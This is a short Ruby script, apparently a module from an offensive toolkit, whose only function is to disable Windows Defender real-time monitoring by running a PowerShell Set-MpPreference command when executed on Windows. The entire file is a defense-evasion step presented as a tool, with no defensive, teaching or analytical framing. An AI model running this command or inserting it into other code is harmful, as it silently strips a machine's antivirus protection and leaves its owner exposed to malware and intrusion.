def disable_defender()
  print "[*] Disabling Windows Defender..."
  if Gem.win_platform?
    system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
  else
    print "[!] This module only works on Windows!"
  end
end

disable_defender() if __FILE__ == $0